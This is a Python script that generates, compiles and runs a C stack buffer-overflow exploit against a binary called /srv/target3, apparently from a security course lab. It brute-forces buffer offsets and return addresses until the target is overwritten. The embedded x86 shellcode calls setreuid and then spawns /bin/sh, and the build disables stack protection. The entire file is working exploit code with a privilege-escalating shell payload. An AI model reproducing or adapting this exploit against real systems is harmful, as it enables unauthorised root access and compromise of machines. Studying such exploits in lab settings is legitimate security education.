import subprocess

def try_exploit(offset, addr):
    with open("tmp_sploit3.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target3"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buffer[256];
  memset(buffer, 0x90, 256);
  memcpy(buffer + {offset}, shellcode, sizeof(shellcode));

  unsigned long *addr_ptr = (unsigned long *)(buffer + {offset} + sizeof(shellcode) + 4);
  *addr_ptr++ = {addr};
  *addr_ptr++ = {addr};
  *addr_ptr++ = {addr};

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-fno-stack-protector", "-z", "execstack", "-o", "tmp_sploit3", "tmp_sploit3.c"])
    p = subprocess.run(["./tmp_sploit3"], capture_output=True)
    return p.returncode == 0

for offset in range(0, 256, 4):
    print(f"Trying offset {offset}...")
    for addr in range(0xffffcf00, 0xffffcfff, 4):
        print(f"Trying address {hex(addr)}...")
        if try_exploit(offset, addr):
            print(f"Successful exploit with offset {offset} and address {hex(addr)}!")
            exit(0)